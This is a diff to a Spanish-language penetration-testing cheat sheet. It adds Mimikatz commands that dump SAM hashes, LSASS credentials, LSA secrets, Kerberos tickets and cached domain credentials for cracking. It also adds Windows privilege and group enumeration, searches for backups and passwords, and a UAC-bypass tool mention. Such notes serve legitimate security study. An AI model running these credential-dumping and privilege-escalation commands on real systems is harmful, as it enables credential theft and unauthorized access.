@@ -34,20 +34,24 @@ netstat.exe -ano
 
 #### 🧪 Mimikatz
 ```powershell
-# SAM
+# SAM (usuarios locales + hashes)
 .\mimikatz.exe privilege::debug lsadump::sam exit > dumpSAM.txt
 
-# LSASS
+# LSASS (credenciales en memoria: texto plano, NTLM, etc.)
 .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > dumpLSASS.txt
 
-# Secrets
+# Secrets (LSA secrets + DPAPI keys + secretos de servicios)
 .\mimikatz.exe privilege::debug lsadump::lsa /patch exit > secrets_lsa.txt
 
-# Ekeys
+# Ekeys (claves de cifrado para Pass-The-Key / DPAPI)
 .\mimikatz.exe privilege::debug sekurlsa::ekeys exit > ekeys.txt
 
-# Tickets
+# Tickets (Kerberos TGT/TGS para PTT, silver/golden ticket)
 .\mimikatz.exe privilege::debug sekurlsa::tickets /export exit
+
+# Cache (credenciales de dominio en caché, útiles sin conexión al DC - hay que craquear con hascat -m 2100)
+.\mimikatz.exe privilege::debug lsadump::cache exit > cache.txt
+
 ```
 #### 🗝️ Uso de credenciales
 - PTH, PTT, Pass-the-key, credenciales en texto plano.
@@ -126,6 +130,8 @@ env
 #### 📁 Búsqueda de archivos sospechosos
 
 ```bash
+# Archivos no vacíos
+find . -type f -size +0c
 # Backups, archivos ocultos y nombres sospechosos:
 find / -type f \( -iname "*.old" -o -iname "*.bak" -o -iname "*.backup" -o -iname "*copy*" -o -iname "*backup*" -o -iname "*config*" -o -iname "*save*" -o -iname "*temp*" -o -iname "*dump*" -o -iname "*test*" -o -iname "*.zip" -o -iname "*.tar" -o -iname "*.gz" -o -iname ".*.swp" -o -iname ".*.git" \) 2>/dev/null
 
@@ -173,15 +179,35 @@ grep -rEi "password|secret|token|key|creds" /opt /srv /var/backups /var/www/html
 
 
 ### 🪟 Escalada de privilegios en Windows
-
+```
+whoami /priv
+```
 #### 🔑 Privilegios explotables
-- **SeImpersonatePrivilege**: permite ejecutar ataques como Juicy Potato, PrintSpoofer.
-- **SeDebugPrivilege**: acceso a procesos ajenos, como LSASS.
-- **SeTakeOwnershipPrivilege**: puedes adueñarte de objetos protegidos.
-- **SeRestorePrivilege / SeBackupPrivilege**: lectura de archivos normalmente inaccesibles.
-- **SeChangeNotifyPrivilege**: muy común, pero a veces útil para DLL hijacking.
+
+- **`SeImpersonatePrivilege`**: permite ejecutar ataques como Juicy Potato, PrintSpoofer.
+- **`SeDebugPrivilege`**: acceso a procesos ajenos, como LSASS.
+- **`SeTakeOwnershipPrivilege`**: puedes adueñarte de objetos protegidos.
+- **`SeRestorePrivilege` / `SeBackupPrivilege`**: lectura de archivos normalmente inaccesibles.
+- **`SeChangeNotifyPrivilege`**: Permite activar otros privilegios
 
 #### 👥 Grupos integrados de Windows
+- Búsqueda de grupos intersantes
+	```powershell
+	whoami /groups | findstr /i "Backup Operators Event Log Readers DnsAdmins Print Operators Server Operators"
+	# o una búsqueda más afinada
+	$targetGroups = @(
+	  "BUILTIN\Backup Operators",
+	  "BUILTIN\Event Log Readers",
+	  "BUILTIN\DnsAdmins",
+	  "BUILTIN\Print Operators",
+	  "BUILTIN\Server Operators"
+	)
+	
+	$groups = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups |
+	    ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]) }
+	
+	foreach ($group in $groups) { if ($targetGroups -contains $group.Value) { Write-Output "Perteneces a: $($group.Value)" }}
+	```
 - **Administrators**: acceso total.
 - **Backup Operators**: lectura y backup de archivos, incluso protegidos.
 - **Event Log Readers**: acceso a logs con info sensible.
@@ -200,6 +226,8 @@ Detectables con herramientas como PowerUp, WinPEAS o manualmente:
 - `Seatbelt`: recolección de info sensible/local.
 - `PowerUp`: detección de vectores típicos de privesc.
 - `Snaffler`: búsqueda de archivos jugosos en red o disco.
+- `Watch-command`: Permite monitorear procesos y servicios
+-  `Invoke-EventViewer`: Bypass UAC
 
 #### 🐞 Kernel exploits (TODO)
 - Identifica versión del sistema (`systeminfo`) y compara con exploits conocidos (e.g., MS16-032).
@@ -211,14 +239,19 @@ Detectables con herramientas como PowerUp, WinPEAS o manualmente:
 #### 🪟 Archivos sospechosos
 
 ```powershell
-# Buscar archivos con nombres sugerentes:
-Get-ChildItem -Path C:\ -Recurse -Include *.bak,*.old,*.zip,*.rar,*.7z,*.tar,*.gz,*backup*,*copy*,*temp*,*save*,*config*,*test* -ErrorAction SilentlyContinue -Force
+# Buscar archivos no vacíos
+Get-ChildItem -File -Recurse | Where-Object { $_.Length -gt 0 }
+
+# Buscar archivos con nombres sugerentes (añadir -File si queremos solo archivos , y quitar el where-object si no queremos):
+Get-ChildItem -Path C:\ -Recurse -Include *.bak,*.old,*.zip,*.rar,*.7z,*.tar,*.gz,*backup*,*copy*,*temp*,*save*,*config*,*test* -ErrorAction SilentlyContinue -Force | Where-Object { $_.FullName -notmatch '^C:\\Windows' -and $_.FullName -notmatch '^C:\\Program Files' -and $_.FullName -notmatch '^C:\\Program Files \(x86\)' }
 
 # Buscar carpetas con nombres sospechosos:
 Get-ChildItem -Path C:\ -Recurse -Directory -Include *backup*,*old*,*copy*,*temp*,*save* -ErrorAction SilentlyContinue -Force
 
-# Buscar posibles contraseñas en archivos de texto:
-Select-String -Path C:\Users\*\Documents\*,C:\Users\*\Desktop\* -Pattern "password|passwd|secret|credentials|key" -CaseSensitive -ErrorAction SilentlyContinue
+
+# Buscar archivos dentro de esas carpetas y buscar patrones sensibles (darle nombre $dir a la búsqueda que queramos yu buscar)
+foreach ($dir in $dirs) { Get-ChildItem -Path $dir.FullName -Recurse -File -ErrorAction SilentlyContinue | Select-String -Pattern "password|passwd|secret|credentials|key" -CaseSensitive:$false -ErrorAction SilentlyContinue | Select-Object Path, LineNumber, Line }
+
 
 # Buscar archivos de configuración expuestos:
 Get-ChildItem -Path C:\ -Recurse -Include *.config,*.ini,*.xml -ErrorAction SilentlyContinue -Force
